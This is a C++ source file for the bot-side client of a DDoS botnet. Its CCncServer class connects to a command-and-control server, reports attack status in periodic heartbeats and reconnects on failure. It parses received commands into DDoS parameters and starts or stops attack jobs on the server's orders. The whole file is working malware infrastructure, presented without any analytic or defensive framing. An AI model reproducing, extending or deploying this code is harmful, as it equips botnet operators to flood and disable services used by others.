#include <arpa/inet.h>

#include "netpool.h"
#include "xtool.h"
#include "CDDoSParams.h"
#include "CDDoSParser.h"
#include "CDDoSApp.h"

#include "xtool.h"
#include "util.h"
#include "util_str.h"
#include "CCncServer.h"
#include "CAttack.h"
#include "CAttackMgr.h"

CCncServer *g_cncServer = NULL;

CCncServer::CCncServer(uint32_t ipaddr, uint16_t port) {
	// TODO Auto-generated constructor stub
    m_fd_serv = -1;
    m_srv_ip = ipaddr;
    m_srv_port = port;

    m_recv_len = 0;
}

CCncServer::~CCncServer() {
	// TODO Auto-generated destructor stub
}


void CCncServer::on_write(int32_t fd, void* param1)
{
    CCncServer *cncServer = (CCncServer*)param1;

    if (cncServer->m_fd_serv != fd)
    {
        RC_LOG_ERROR("fd %d not valid, should %d", fd, cncServer->m_fd_serv);
        return;
    }

    etp_del_write_job(fd);
    cncServer->m_pendinng = false;

    int ret = 0;
    int err = 0;
    socklen_t err_len = sizeof (err);

    ret = getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
    if (err == 0 && ret == 0)
    {
        RC_LOG_INFO("connect cnc success");

        /*send message*/
        char sendbuf[6] = {0x00, 0x00, 0x00, 0x02, 0x00, 0x00};
        if (g_attackMgr.is_all_stopped())
        {
            sendbuf[5] = 0x00;
        }
        else
        {
            sendbuf[5] = 0x01;
        }
        send(fd, sendbuf, 6, MSG_NOSIGNAL);
        if (FALSE == etp_add_read_job(NULL, CCncServer::on_recv, 
                                fd, param1, NULL, 1500))
        {
            RC_LOG_ERROR("add read job init failed.");
            cncServer->close_serv();
            return;
        }
    }
    else
    {
        RC_LOG_WARN("conneted failed while connecting = %d", fd, err);
        cncServer->close_serv();
        return;
    }

    return;
}


void CCncServer::on_recv(int fd, void *param1, struct sockaddr *cliAddr, char *recvBuf, int recvLen)
{
    CCncServer *cncServer = (CCncServer*)param1;

    if (cncServer->m_fd_serv != fd)
    {
        RC_LOG_WARN("FD%d not wanted when recv, should %d.", fd, cncServer->m_fd_serv);
        return;
    }

    if (recvLen == 0)
    {
        RC_LOG_INFO("server close.");
        etp_del_read_job(fd);
        cncServer->close_serv();
        return;
    }

    RC_LOG_DEBUG("get command from server, length %d", recvLen);

    int32_t spareRecvLen = 0;
    int32_t spareLen = 1024 - cncServer->m_recv_len;
    if (spareLen > recvLen)
    {
        spareRecvLen = 0;
        memcpy(cncServer->m_recv_buf + cncServer->m_recv_len, recvBuf, recvLen);
        cncServer->m_recv_len += recvLen;
    }
    else
    {
        spareRecvLen = recvLen - spareLen;
        memcpy(cncServer->m_recv_buf + cncServer->m_recv_len, recvBuf, spareLen);
        cncServer->m_recv_len += spareLen;
    }

    if (cncServer->m_recv_len < 2)
    {
        /*get length*/
        RC_LOG_INFO("now %d, wait length field", cncServer->m_recv_len);
        return;
    }

    uint16_t length = cncServer->m_recv_buf[0]<<16 | cncServer->m_recv_buf[1];

    if (cncServer->m_recv_len < length)
    {
        /*not recv all*/
        RC_LOG_INFO("now %d, wait all data, should %d", cncServer->m_recv_len, length);
        return;
    }

    /*parser data*/
    CDDoSParser parser;
    CDDoSParam ddos_params;
    int cmd_type = 0;
    if (RC_OK != parser.buf_parser(cncServer->m_recv_buf, &cmd_type, &ddos_params))
    {        
        /*adjust buf*/
        memcpy(cncServer->m_recv_buf, recvBuf + recvLen - spareRecvLen, spareRecvLen);
        cncServer->m_recv_len = spareRecvLen;
        RC_LOG_ERROR("parser buf failed, spare %d", cncServer->m_recv_len);
        return;
    }

    /*adjust buf*/
    memcpy(cncServer->m_recv_buf, recvBuf + recvLen - spareRecvLen, spareRecvLen);
    cncServer->m_recv_len = spareRecvLen;

    if (cmd_type == CNC_CMD_STOP)
    {
        RC_LOG_INFO("recv stop command");
        g_attackMgr.stop();
        return;
    }

    CAttack *newJob = g_attackMgr.add_attack_job(ddos_params);
    if (NULL == newJob)
    {
        RC_LOG_ERROR("new attack job failed");
        return;
    }

    if (RC_OK != newJob->init())
    {
        g_attackMgr.del_attack_job(newJob);
        return;
    }
    
    RC_LOG_INFO("%s attack started", newJob->m_name);

    newJob->start();
    return;
}

void CCncServer::expire_handle(void* param1, void* param2, void* param3, void* param4)
{
    CCncServer *cncServer = (CCncServer*)param1;
    uint64_t now = (uint64_t)time(NULL);

    if (cncServer->m_pendinng)
    {        
        if ((now - cncServer->m_pending_time) > 10)
        {
            RC_LOG_INFO("connect cnc timeout");
            etp_del_write_job(cncServer->m_fd_serv);
            cncServer->close_serv();
        }
    }
    else
    {
        if (cncServer->m_fd_serv == -1)
        {
            cncServer->establish_serv();
        }
        else
        {
            static uint64_t latestsend = 0;
            if (now - latestsend >= 10)
            {
                latestsend = now;

                /*send message*/
                char sendbuf[6] = {0x00, 0x00, 0x00, 0x02, 0x00, 0x00};
                if (g_attackMgr.is_all_stopped())
                {
                    sendbuf[5] = 0x00;
                }
                else
                {
                    sendbuf[5] = 0x01;
                }
                send(cncServer->m_fd_serv, sendbuf, 6, MSG_NOSIGNAL);
            }
        }
    }

    g_attackMgr.self_check_stopped();
}

void CCncServer::establish_serv()
{
    struct sockaddr_in srv_addr;

    if ((m_fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        RC_LOG_ERROR("socket failed");
        return;
    }

    /*set to nonblock*/
    etp_sock_set_unblock(m_fd_serv);

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = htonl(m_srv_ip);
    srv_addr.sin_port = htons(m_srv_port);

    m_pendinng = true;
    m_pending_time = time(NULL);
    connect(m_fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));

    RC_LOG_INFO("try connect cnc");
    if (FALSE == etp_add_write_job(NULL, CCncServer::on_write, m_fd_serv, (void*)this))
    {
        RC_LOG_ERROR("add write job init failed.");
        close_serv();
        return;
    }
}

void CCncServer::close_serv()
{
    close(m_fd_serv);
    m_fd_serv = -1;

    m_pending_time = 0;
    m_pendinng = false;
}

int CCncServer::start() 
{
    establish_serv();

    /*start check timer*/
    etp_add_time_job(NULL, CCncServer::expire_handle,
                    (void*)this, NULL, NULL, NULL, 1, FALSE);

    return RC_OK;
}

void CCncServer::stop()
{
    return;
}

void CCncServer::destroy()
{
    /*delete timer*/
    etp_del_time_job(CCncServer::expire_handle, (void*)this);
    close_serv();
}

bool CCncServer::is_stopped()
{
    return false;
}